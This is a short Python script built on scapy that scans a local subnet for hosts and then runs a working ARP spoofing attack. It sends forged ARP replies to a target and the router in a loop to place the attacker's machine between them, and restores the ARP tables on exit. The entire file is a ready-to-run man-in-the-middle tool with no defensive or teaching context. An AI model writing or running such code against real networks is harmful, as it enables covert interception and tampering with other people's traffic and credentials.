import scapy.all as scapy
import time

# for sending packets to target and router by locating their mac
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answer[0][1].hwsrc

# for executing program
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # op=2 for arp respond, op=1 for arp request
    scapy.send(packet, verbose=False)

# for fixing after exit
def restore(destination_ip, router_ip):
    destination_mac = get_mac(destination_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst = destination_mac, psrc = router_ip, hwsrc = router_mac)
    scapy.send(packet, verbose=False)

# scanning whole network for host
def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    targets_list = []
    for ele in answer:
        targets = {"ip": ele[1].psrc, "mac": ele[1].hwsrc}
        targets_list.append(targets)
    return targets_list

def print_result(targets_list):
    print('IP\t\t\t MAC Address\n---------------------------------------------------------')
    for client in targets_list:
        print(client["ip"] + "\t\t" + client["mac"])
    print('\n')
scan_result = scan('192.168.43.1/24')
print_result(scan_result)

# main progarm body
target = input("Enter IP of the target : ")
router = input("Enter IP of the router : ")
i = 0
try:
    while True:
        spoof(router, target)
        spoof(target,router)
        i = i + 2
        print('\r[+] Packet send : {}'.format(i), end='')
        time.sleep(1)
except KeyboardInterrupt:
    restore(target, router)
    restore(router, target)
    print('\n[-] Quitting...')

